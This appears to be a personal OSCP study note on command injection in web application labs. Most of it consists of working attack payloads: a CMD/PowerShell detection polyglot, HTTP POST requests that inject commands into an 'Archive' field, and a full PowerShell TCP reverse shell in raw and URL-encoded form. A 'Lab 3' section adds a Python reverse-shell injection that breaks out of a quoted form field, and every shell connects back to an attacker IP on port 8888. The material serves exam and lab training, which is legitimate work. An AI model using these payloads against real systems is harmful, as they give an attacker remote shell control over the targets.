---
aliases: 
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - web_application
  - web_app
  - web_app_attack
  - command_injection
author: Mehdi N Tehrani
creat_date: 2023-12-23
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# powershell or cmd
#pwsh_or_cmd #cmd_or_pwsh #cmd_or_powershell #powershell_or_cmd
depending on which environment this command is run in, it outputs `CMD` or `PowerShell`:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

1. Try `git version` to find out if the OS is Linux or Windows:
```http
POST /archive HTTP/1.1
Host: 192.168.190.189:8000
...
Referer: http://192.168.190.189:8000/
Upgrade-Insecure-Requests: 1

Archive=git%20version
```

2. Find out powershell or cmd is running the command:
```http
POST /archive HTTP/1.1
Host: 192.168.190.189:8000
...
Referer: http://192.168.190.189:8000/
Upgrade-Insecure-Requests: 1

Archive=git%20version%3B%28dir%202%3E%261%20%2A%60%7Cecho%20cmd%29%3B%26%3C%23%20rem%20%23%3Eecho%20pwsh
```
output:
```
Repository successfully cloned with command: git version;(dir 2>&1 *`|echo cmd);&<# rem #>echo pwsh and output: git version 2.36.1.windows.1
pwsh
```

3. URL-encode powershell reverse shell:
```sh
hURL -U '$c=new-object System.Net.Sockets.TcpClient(''192.168.45.216'', 8888); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$s.Read($b,0,$b.length)) -ne 0){$d=(new-object System.Text.ASCIIEncoding).GetString($b,0,$i); $sb=(iex $d 2>&1|Out-String)+"PS $(pwd)> ";$sbb=([System.Text.Encoding]::ASCII.GetBytes($sb));$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()'
```

4. get a reverse shell
```
Archive=git%20version%3B%24c%3Dnew-object%20System.Net.Sockets.TcpClient%28%22192.168.45.216%22%2C%208888%29%3B%20%24s%3D%24c.GetStream%28%29%3B%20%5Bbyte%5B%5D%5D%24b%3D0..65535%7C%25%7B0%7D%3B%20while%28%28%24i%3D%24s.Read%28%24b%2C0%2C%24b.length%29%29%20-ne%200%29%7B%24d%3D%28new-object%20System.Text.ASCIIEncoding%29.GetString%28%24b%2C0%2C%24i%29%3B%20%24sb%3D%28iex%20%24d%202%3E%261%7COut-String%29%2B%22PS%20%24%28pwd%29%3E%20%22%3B%24sbb%3D%28%5BSystem.Text.Encoding%5D%3A%3AASCII.GetBytes%28%24sb%29%29%3B%24s.Write%28%24sbb%2C0%2C%24sbb.Length%29%3B%24s.Flush%28%29%7D%3B%24c.Close%28%29dc
```


## Lab 3
in ffa field enter the following command to get a reverse shell:
```
" && python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.216",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' #
```